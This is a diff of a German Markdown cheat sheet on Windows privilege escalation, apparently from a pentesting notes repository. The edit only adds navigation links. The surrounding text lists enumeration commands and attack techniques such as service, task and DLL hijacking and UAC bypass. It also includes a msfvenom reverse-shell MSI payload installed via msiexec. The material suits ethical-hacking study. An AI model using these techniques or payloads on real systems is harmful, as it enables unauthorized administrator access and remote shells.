@@ -14,6 +14,12 @@ Diese Datei dokumentiert Methoden, Tools und Vorgehensweisen zur Privilegienerwe
 
 
 
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 ## Nützliche Tools
 
 ### 1. `whoami`-Befehle
@@ -24,6 +30,14 @@ whoami /groups         # Gruppenmitgliedschaften (z. B. Admins)
 whoami /priv           # Aktive Berechtigungen des Benutzers
 ```
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 2. `accesschk.exe` von Sysinternals
 
 Tool zur Analyse von Zugriffsrechten:
@@ -32,6 +46,14 @@ Tool zur Analyse von Zugriffsrechten:
 accesschk.exe -uws "Benutzer" *               # Zugriffsrechte auf Dienste
 accesschk.exe -ucqv Benutzer Pfad\zur\Datei  # Detaillierte Rechteprüfung
 ```
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 ### 3. `Seatbelt.exe`
 
@@ -42,6 +64,15 @@ Seatbelt.exe all
 ```
 
 Funktioniert gut bei eingeschränkten Benutzerrechten – erkennt z. B. gespeicherte Passwörter, schwache Registry-Einstellungen usw.
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### 4. `WinPEAS.exe`
 
@@ -73,6 +104,15 @@ sc qc <ServiceName>
 
 Pfad zu ausführbarer Datei enthält Leerzeichen → eigene Binärdatei einschleusen.
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 2. Schwache Dienstrechte (Insecure Permissions)
 
 Benutzer hat Schreibrechte auf den Dienst:
@@ -83,6 +123,15 @@ accesschk.exe -uws Benutzer *
 
 → Dienstdatei oder Binärpfad ersetzen.
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 3. Scheduled Tasks mit schwachen Rechten
 
 ```bash
@@ -91,6 +140,15 @@ schtasks /query /fo LIST /v
 ```
 
 → Aufgabe manipulieren oder durch Trojaner ersetzen.
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### 4. AlwaysInstallElevated (MSI-Bypass)
 
@@ -118,6 +176,14 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi
 msiexec /quiet /qn /i shell.msi
 ```
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 5. DLL Hijacking
 
 Wenn ein ausführbares Programm DLLs aus unsicheren Pfaden lädt:
@@ -126,6 +192,14 @@ Wenn ein ausführbares Programm DLLs aus unsicheren Pfaden lädt:
 * In priorisierten Ordnern (gleicher Pfad wie EXE) ablegen
 
 Tools zur Analyse: [Procmon.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### 6. UAC-Bypass (User Access Control)
 
@@ -138,6 +212,12 @@ UACMe-Tool: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACM
 
 
 
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 ## Tipps zur Analyse
 
 * **PowerUp.ps1** (PowerShell Framework)
@@ -146,12 +226,25 @@ UACMe-Tool: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACM
 
 
 
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Weiterführende Links
 
 * [GTFOBins Windows Pendant: LOLBAS](https://lolbas-project.github.io/)
 * [Windows-Privilege-Escalation-Cheat-Sheet](https://github.com/netbiosX/Checklists)
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 ## Haftungsausschluss
 
@@ -165,12 +258,6 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 [Disclaimer](/00-disclaimer/disclaimer.md)
 
 --- 
-
-<div align=right>
-
-[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
-
-</div>
 
 Stay curious – stay secure. 🔐
 
